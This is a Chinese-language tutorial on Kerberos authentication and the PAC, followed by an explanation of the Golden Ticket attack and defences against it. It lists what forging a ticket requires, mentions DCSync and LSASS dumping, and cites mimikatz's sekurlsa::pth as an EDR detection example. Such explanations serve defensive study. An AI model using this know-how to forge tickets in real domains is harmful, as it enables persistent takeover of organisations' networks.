Kerberos的基本概念

Kerberos 是一种基于加密 Ticket 的身份认证协议。Kerberos 主要由三个部分组成：Key Distribution Center (即KDC)、Client 和 Service。

  • Client代表用户，用户有自己的密码，Server上运行的服务也有自己的密码，KDC是受信任的三方认证中心，它拥有用户和服务的密码信息。
  • KDC服务默认会安装在域控中，Client想要访问Server的服务（xxx service），前提是通过KDC认证，再由KDC发放的票据决定Client是否有权限访问Server的服务。
  • KDC 服务框架中包含一个 Krbtgt 账户，它是在创建域时系统自动创建的一个账号，你可以暂时理解为他就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。

关键角色：

KDC（密钥分发中心）：在域环境中，KDC服务默认会安装在域控中，包含以下两个部分：

  • AS（认证服务）：验证Client的credential（身份认证信息），发放TGT 。
  • TGS（票据授权服务）： 票据授权服务，验证TGT，发放ST。

TGT（票据授权票据）： 由KDC的AS发放，客户端获取到该票据后，以后申请其他应用的服务票据（ST）时，就不需要向KDC的AS提交身份认证信息(credential)，TGT具有一定的有效期。由 KBRTGT HASH 加密的 sessionkey-as 和 Timestamp 等信息。

ST（服务票据）：由KDC的TGS发放，是客户端应用程序访问Server某个服务的凭证，Server端验证通过则完成Client与Server端信任关系的建立。

Session key：用来加密Client和TGS之间传输的数据。

Server session key：用来加密Client和Server之间传输的数据。

Client： 想要访问服务的用户或客户端。

Server： 客户端想要访问的特定服务。

Kerberos认证流程

大致认证流程如下图所示：

整个认证步骤，大致分为三个大阶段，共六个步骤：

  • AS_REQ & AS_REP
  • TGS_REQ & TGS_REP
  • AP_REQ & AP_REP

Kerberos 协议的核心思想是：“不通过网络传输用户密码，而是通过加密票据来证明身份。”

为了理解这个过程，我们用一个经典的 “线下活动入场” 比喻：

KDC： 整个认证系统的核心大脑，它包含两个部分：

  • 认证服务器（AS）： 活动大厅门口的总售票处，负责第一阶段的认证，验证你的身份，给你一个“通票”。
  • 票据授予服务器（TGS）： 活动内部的分项目验票处，负责第二阶段的授权，你用“通票”来换取各个服务的“专场票”。

客户机（Client）： 你，想要访问服务的用户或客户端。

应用服务器（Server）： 你想参加的特定专场活动，客户端想要访问的特定服务。

Ticket： 票据，是证明你身份的凭证，被服务器的密钥加密过，客户端自己无法解密或伪造。

TGT： 一种特殊的票据，是通往 TGS 的“通票”。由 TGS 的密钥加密。

Session Key： 会话密钥，由 KDC 生成，用于 Client 和 Server 之间进行安全通信的一次性密钥。

域名： 整个活动的 主办方

你的目标是：最终进入 “特定专场活动”。

详细认证流程

阶段一：认证服务交换 - 获取“通票”

目标： 向 AS 证明你是谁，并获取一个通往 TGS 的“通票”。

  • 第1步： Client -> AS（AS_REQ）
    • 客户端向认证服务器发送一个明文请求：“我是用户 Alice，我想要一个访问 TGS 的票据。”
    • Client --(Alice 想要 TGT)--> AS
  • 第2步： AS -> Client（AS_REP ）
    • AS 收到请求后，它会做两件事：
      1. 检查客户端ID是否在KDC数据库中，如果检查操作没有异常，那么将生成一个用于 Client 和 TGS 之间通信的 会话密钥。
      2. 创建一个 TGT，里面包含：Client ID、TGS Session Key、时间戳、有效期等。这个 TGT 是用 TGS 的密钥加密的，所以 Client 看不懂，也改不了。
    • AS 将这两样东西回复给 Client：
      • A部分： TGS Session Key 和 TGT 等信息，用 Alice 的密码派生出的密钥进行加密。只有正确的 Alice 才能解密。
      • B部分： TGT 本身（这个 TGT 是用 KDC 中krbtgt账户的密码 Hash (即krbtgt的密钥) 进行加密的，Client 无法解密）。
    • AS --(加密的Session Key + TGT)--> Client
  • 此时，Client 收到回复后：
    • 它会尝试用 Alice 的密码派生的密钥来解密 A 部分。如果密码正确，就能成功取出 TGS Session Key 和 TGT 信息。
    • 如果密码错误，解密失败，认证流程就此终止。
    • 从此以后，Client 不再需要输入或使用 Alice 的密码了。

阶段二：票据授予服务交换 - 获取“专场票”

目标： 用刚才拿到的“通票（TGT）”去换取访问具体服务的“专场票”。

  • 第3步： Client -> TGS（TGS_REQ）
    • 客户端现在要准备两个东西发给 TGS：
      1. 认证器： 用上一步获得的 TGS Session Key 加密的当前时间戳。这用来证明你就是刚才那个拿到 TGT 的人。
      2. TGT： 从第2步拿到的那个（被 TGS 密钥加密的）票据。
      3. （同时告诉 TGS）你想访问哪个服务，例如 host/server.example.com。
    • Client --(TGT + 加密的认证器 + 目标服务名)--> TGS
  • 第4步： TGS -> Client（TGS_REP）
    • TGS 收到请求后：
      1. TGS 会使用自己的krbtgt账户的 Hash 来解密 TGT，取出里面的 TGS Session Key 和 Client ID 等信息。
      2. 将客户端ID与TGT的客户端ID进行比较。
      3. 用取出的 TGS Session Key 去解密认证器，验证请求的合法性（防止重放攻击）。
      4. 验证 TGT 是否在有效期内。
    • 如果全部通过，TGS 认为 Client 是可信的。然后它做两件事：
      1. 生成一个用于 Client 和 最终应用服务器之间通信的 服务会话密钥。
      2. 创建一个 服务票据（ST），里面包含：Client ID、Service Session Key、时间戳等。这个服务票据是用目标应用服务器的密钥加密的。
    • TGS 将这两样东西回复给 Client：
      • A部分： Service Session Key 和服务票据等信息，用 TGS Session Key 加密。
      • B部分： 服务票据 本身（已被应用服务器的密钥加密，Client 依然无法解密）。
    • TGS --(加密的Service Session Key + 服务票据)--> Client

阶段三：客户端/服务器认证交换 - 使用“专场票”入场（AP_REQ）

目标： 拿着“专场票（ST）”去访问最终的服务。

  • 第5步： Client -> Application Server（AP_REQ）
    • 客户端现在准备两个东西发给应用服务器：
      1. 认证器： 用第4步获得的 Service Session Key 加密的当前时间戳。
      2. 服务票据： 从第4步拿到的那个（被应用服务器密钥加密的）票据。
    • Client --(服务票据 + 加密的认证器)--> App Server
  • 第6步： App Server -> Client（AP_REP）
    • 应用服务器收到请求后：
      1. 用自己的密钥解密服务票据，取出里面的 Service Session Key 和 Client ID。
      2. 用取出的 Service Session Key 去解密认证器，验证时间戳。
    • 如果验证成功，服务器就确认了客户端的身份。
    • （可选，用于双向认证） 服务器可以从认证器中取出时间戳，用 Service Session Key 加密后发回给客户端，证明它也是真实的服务器（因为它能正确解密票据并获取 Session Key）。
    • App Server --(可选：加密的时间戳+1)--> Client

至此，双向认证完成， Client 和 Server 都确认了对方的身份，服务器根据服务票据中包含的客户端 **PAC (Privilege Attribute Certificate)**信息 (包括用户的 SID、组 SID 等)，进行 授权，决定客户端是否有权限访问请求的资源。

Kerberos 的优势：

  • 密码不网络传输： 密码只在第一步本地生成密钥，用于解密，从未在网络上发送。
  • 单点登录： TGT 有有效期，在有效期内，Client 无需再次输入密码，就可以用 TGT 换取访问任何已授权服务的票据。
  • 双向认证： 客户端和服务端可以互相验证身份。
  • 防重放攻击： 通过时间戳和认证器机制实现。

何为PAC

我们知道在Kerberos最初的设计的流程里只说了如何证明客户端的真实身份, 并没有说明客户端是否有权限访问该服务,因为在域中不同的权限的用户 能够访问的资源是不同的,因此微软为了解决这个权限为题引入了PAC（特权属性证书）。

引入PAC以后,在AS_REP阶段返回的TGT中会包含PAC，TGS_REQ阶段中client将带有PAC的TGT发送给KDC，KDC除了验证TGT的合法性以外，还会验证PAC的合法性，如果两者都验证通过，再重新构造新的PAC放在ST里返回给客户端，client带着这个PAC去请求服务，服务会根据PAC中的user id和group id来判断client具有的权限。

PAC主要有两个部分组成，一个是用户信息，一个是两个数字签名。

①用户信息：Client的User的SID、Group的SID等信息。根据用户信息去判断权限

②数字签名：这两个签名的作用是确保PAC不被篡改

黄金票据

黄金票据 （Golden Ticket）是一种针对 Kerberos 认证中 TGT (Ticket Granting Ticket，票据授权票据）的伪造攻击，允许攻击者在获取特定凭据后，无限期地伪造任意域用户，包括域管理员。

基本原理

Kerberos 认证的核心在于 krbtgt账户，它是域控制器 (KDC) 用于签发所有 TGT 的关键账户。如果攻击者能够获取到域控上krbtgt账户的 NTLM Hash，就意味着掌握了域内所有 TGT 的签名密钥。

攻击者一旦拥有krbtgt的 Hash，就可以离线伪造任意用户身份的 TGT。这个伪造的 TGT 会被 KDC 认为是合法的，因为它用正确的krbtgt Hash 签名。有了伪造的 TGT，攻击者就可以向 KDC 申请 任意服务票据 (TGS)，从而访问域内任何资源，而无需与真正的用户密码进行交互，也不受用户密码修改的影响。

核心点：只要掌握了krbtgt的 Hash (通常通过 DCSync 或域控提权后 dump 获取)，就可以持续伪造有效的 TGT，实现对域的完全控制。

黄金票据伪造的所需条件

  1. 域名称
  2. 域的 SID 值
  3. 域的 KRBTGT 账号的 HASH

危害

**完全域控制：**攻击者可伪造任意域用户甚至域管账户的身份，长期保持对域的完全访问权限，包括访问所有文件共享、运行任意服务、修改AD对象等。

**持久性：**即使krbtgt账户的密码被修改，只要攻击者仍然拥有旧的krbtgtHash (或没有进行双次密码重置)，他们仍然可以生成有效的黄金票据，攻击效果持久。

防御手段

  1. **定期更换krbtgt账户的密码：**这是最核心的防御措施。官方建议每 180 天至少更换一次。在域内，krbtgt密码的更改需要进行两次操作，以确保所有 DC 都能正确同步。第一次重置后，需要等待一段时间（通常为 Kerberos 票据默认有效期），再进行第二次重置。这会使旧的krbtgtHash 失效。
  2. 启用事件日志审计：
    • 尤其关注事件 ID4768(A Kerberos authentication ticket (TGT) was requested) 和4769(A Kerberos service ticket was requested)。异常的请求源、请求账户或请求模式都可能是攻击迹象。
    • **监控 LSASS 进程访问：**检测对 LSASS 进程的异常访问，例如非特权用户尝试读取 LSASS 内存，这可能是攻击者在尝试 dump Hash。事件 ID4656(A handle to an object was requested) 结合Access Mask可以帮助识别。
  3. **使用 EDR (Endpoint Detection and Response) 检测：**EDR 能够检测可疑的票据注入行为 (例如mimikatz的sekurlsa::pth操作) 以及对lsass.exe进程的异常访问和内存读取。
  4. **限制域控访问：**严格限制能够物理或逻辑访问域控制器的用户和设备。
  5. 虽然黄金票据绕过密码认证，但如果 Kerberos 服务支持 MFA，可以增加攻击的难度。
